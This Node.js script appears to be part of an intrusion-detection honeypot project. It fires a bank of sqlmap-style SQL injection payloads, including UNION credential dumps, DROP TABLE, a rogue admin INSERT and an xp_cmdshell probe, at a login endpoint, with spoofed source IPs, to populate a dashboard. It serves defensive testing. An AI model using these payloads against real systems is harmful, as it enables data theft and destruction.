#!/usr/bin/env node
/**
 * PhantomIDS — SQLi Attack Simulator
 * ====================================
 * Fires realistic sqlmap-style SQL injection payloads at the honeypot
 * endpoint to populate the dashboard with live attack data.
 *
 * Usage:
 *   node scripts/attack-sim.js                  # default: localhost:5000
 *   node scripts/attack-sim.js 192.168.1.6 5000 # custom host/port
 *   node scripts/attack-sim.js --esp32           # also simulate ESP32 alerts
 */

const http = require('http');

const TARGET_HOST = process.argv[2] && !process.argv[2].startsWith('--')
  ? process.argv[2]
  : 'localhost';
const TARGET_PORT = parseInt(process.argv[3]) || 5000;
const SIMULATE_ESP32 = process.argv.includes('--esp32');

// ── Realistic sqlmap payload bank ────────────────────────────────────────────
const PAYLOADS = [
  // Boolean-based blind
  { username: "admin' AND 1=1--",           password: "x",          label: "Boolean TRUE"         },
  { username: "admin' AND 1=2--",           password: "x",          label: "Boolean FALSE"        },
  { username: "admin' AND 2860=2860--",     password: "x",          label: "Boolean numeric"      },
  // UNION-based
  { username: "' UNION SELECT NULL--",      password: "x",          label: "UNION NULL probe"     },
  { username: "' UNION SELECT 1,2,3--",     password: "x",          label: "UNION col count"      },
  { username: "' UNION SELECT username,password,role FROM users--", password: "x", label: "UNION dump" },
  // Error-based
  { username: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", password: "x", label: "Error-based" },
  { username: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",   password: "x", label: "CASE WHEN"   },
  // Time-based blind
  { username: "' AND SLEEP(1)--",           password: "x",          label: "SLEEP probe"          },
  { username: "'; WAITFOR DELAY '0:0:1'--", password: "x",          label: "WAITFOR (MSSQL)"      },
  // Stacked queries
  { username: "'; DROP TABLE users--",      password: "x",          label: "Stacked DROP"         },
  { username: "'; INSERT INTO users VALUES(99,'hacked','pwned','admin')--", password: "x", label: "Stacked INSERT" },
  // OR bypass
  { username: "' OR '1'='1",               password: "' OR '1'='1", label: "OR bypass"            },
  { username: "' OR 1=1--",                password: "x",           label: "OR 1=1"               },
  { username: "admin'--",                  password: "anything",    label: "Comment bypass"       },
  // Encoding evasion
  { username: "ad%6Din' OR 1=1--",         password: "x",           label: "URL encoded"          },
  { username: "' OR CHR(49)=CHR(49)--",    password: "x",           label: "CHR() evasion"        },
  // xp_cmdshell probe
  { username: "'; EXEC xp_cmdshell('whoami')--", password: "x",     label: "xp_cmdshell"          },
  // Fingerprinting
  { username: "' AND @@version--",         password: "x",           label: "Version fingerprint"  },
  { username: "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--", password: "x", label: "MySQL fingerprint" },
  // Normal login (to mix in clean traffic)
  { username: "admin",                     password: "wrongpass",   label: "Normal (clean)"       },
  { username: "john.doe",                  password: "password1",   label: "Normal (success)"     },
];

// ── Fake attacker IPs ─────────────────────────────────────────────────────────
const ATTACKER_IPS = [
  '192.168.1.7',
  '10.0.0.42',
  '172.16.0.99',
  '192.168.1.105',
];

// ── HTTP helper ───────────────────────────────────────────────────────────────
function post(path, body, spoofIp) {
  return new Promise((resolve) => {
    const bodyStr = JSON.stringify(body);
    const options = {
      hostname: TARGET_HOST,
      port:     TARGET_PORT,
      path,
      method:   'POST',
      headers: {
        'Content-Type':    'application/json',
        'Content-Length':  Buffer.byteLength(bodyStr),
        'User-Agent':      'sqlmap/1.9.11#stable',
        'X-Forwarded-For': spoofIp || ATTACKER_IPS[0],
      },
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });

    req.on('error', (e) => resolve({ status: 0, error: e.message }));
    req.write(bodyStr);
    req.end();
  });
}

// ── Delay helper ──────────────────────────────────────────────────────────────
const delay = ms => new Promise(r => setTimeout(r, ms));

// ── Main simulation ───────────────────────────────────────────────────────────
async function runSimulation() {
  console.log('\n╔══════════════════════════════════════════════════════╗');
  console.log('║       PhantomIDS — SQLi Attack Simulator             ║');
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  Target  : http://${TARGET_HOST}:${TARGET_PORT}/login`);
  console.log(`║  Payloads: ${PAYLOADS.length} SQLi vectors across ${ATTACKER_IPS.length} fake IPs`);
  console.log(`║  ESP32   : ${SIMULATE_ESP32 ? 'YES — hardware alerts simulated' : 'NO  — use --esp32 flag to enable'}`);
  console.log('╚══════════════════════════════════════════════════════╝\n');

  // Check server is up
  try {
    await post('/honeypot-status', {});
  } catch {
    console.error(`❌  Cannot reach ${TARGET_HOST}:${TARGET_PORT} — is the server running?\n`);
    process.exit(1);
  }

  let sent = 0;
  let errors = 0;

  for (let round = 0; round < 3; round++) {
    console.log(`\n── Round ${round + 1}/3 ──────────────────────────────────────`);

    for (const payload of PAYLOADS) {
      const ip = ATTACKER_IPS[Math.floor(Math.random() * ATTACKER_IPS.length)];
      const result = await post('/login', {
        username: payload.username,
        password: payload.password,
      }, ip);

      const icon = result.status === 200 ? '✓' : '✗';
      const statusLabel = result.status === 0 ? `ERR: ${result.error}` : `HTTP ${result.status}`;
      console.log(`  ${icon} [${ip}] ${payload.label.padEnd(24)} → ${statusLabel}`);

      if (result.status === 0) errors++;
      else sent++;

      // Simulate ESP32 hardware alert for SQLi payloads
      if (SIMULATE_ESP32 && payload.label !== 'Normal (clean)' && payload.label !== 'Normal (success)') {
        const score = payload.username.includes("'") ? 2 : 1;
        await post('/api/esp32/alert', {
          attacker_ip: ip,
          payload:     payload.username,
          score,
        }, ip);
      }

      // Realistic delay between requests (sqlmap pace)
      await delay(120 + Math.random() * 180);
    }
  }

  console.log('\n╔══════════════════════════════════════════════════════╗');
  console.log(`║  Simulation complete!                                ║`);
  console.log(`║  Sent   : ${String(sent).padEnd(4)} requests                            ║`);
  console.log(`║  Errors : ${String(errors).padEnd(4)} (server unreachable)               ║`);
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  Open dashboard → http://${TARGET_HOST}:${TARGET_PORT}/dashboard`);
  console.log('╚══════════════════════════════════════════════════════╝\n');
}

runSimulation().catch(console.error);
